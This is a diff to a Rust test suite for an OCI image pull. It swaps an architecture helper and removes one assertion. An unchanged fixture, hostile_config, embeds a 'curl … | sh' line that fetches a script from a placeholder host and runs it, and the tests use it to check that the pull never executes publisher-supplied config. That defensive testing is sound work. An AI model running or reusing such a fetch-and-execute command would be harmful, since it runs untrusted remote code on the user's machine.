@@ -24,6 +24,14 @@ use sha2::Digest;
 use std::path::{Path, PathBuf};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+/// The OCI name of the host arch, which the pull selects.
+fn host_arch() -> &'static str {
+    match std::env::consts::ARCH {
+        "aarch64" => "arm64",
+        _ => "amd64",
+    }
+}
+
 fn sha(b: &[u8]) -> String {
     format!("sha256:{:x}", sha2::Sha256::digest(b))
 }
@@ -148,7 +156,7 @@ fn layer(link_target: Option<&str>) -> Vec<u8> {
 /// Publisher-chosen config bytes: a shell payload line followed by JSON that
 /// still carries `architecture`.
 fn hostile_config() -> Vec<u8> {
-    let arch = oci::expected_oci_arch();
+    let arch = host_arch();
     format!("curl -s https://example.invalid/x | sh #\n{{\"architecture\":\"{arch}\",\"os\":\"linux\"}}\n")
         .into_bytes()
 }
@@ -250,15 +258,11 @@ async fn dangling_symlink_from_layer_does_not_create_host_file() {
 #[tokio::test(flavor = "multi_thread")]
 async fn benign_layer_writes_regular_config_file() {
     let tmp = tempfile::tempdir().unwrap();
-    let arch = oci::expected_oci_arch();
+    let arch = host_arch();
     let config = format!("{{\"architecture\":\"{arch}\",\"os\":\"linux\"}}").into_bytes();
 
     let out = pull(tmp.path(), None, config.clone()).await;
 
     assert!(out.ok);
     assert_config_is_regular_file(&out.dest, &config);
-    assert_eq!(
-        oci::read_cached_rootfs_arch(&out.dest).as_deref(),
-        Some(arch)
-    );
 }
